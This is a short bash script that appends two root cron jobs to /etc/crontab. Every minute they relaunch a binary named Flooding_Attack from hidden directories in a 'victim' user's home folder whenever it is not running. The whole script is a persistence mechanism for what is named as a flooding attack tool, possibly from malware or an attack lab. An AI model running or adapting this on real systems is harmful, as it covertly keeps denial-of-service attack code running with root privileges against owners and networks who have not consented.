#!/bin/bash

sudo bash -c 'echo "*/1 * * * * root  pgrep Flooding_Attack || /home/victim/.etc/.module/Flooding_Attack" >> /etc/crontab'

sudo bash -c 'echo "*/1 * * * * root  pgrep Flooding_Attack || ([ ! -f /home/victim/.etc/.module/Flooding_Attack ] && /home/victim/.attack/Flooding_Attack)" >> /etc/crontab'
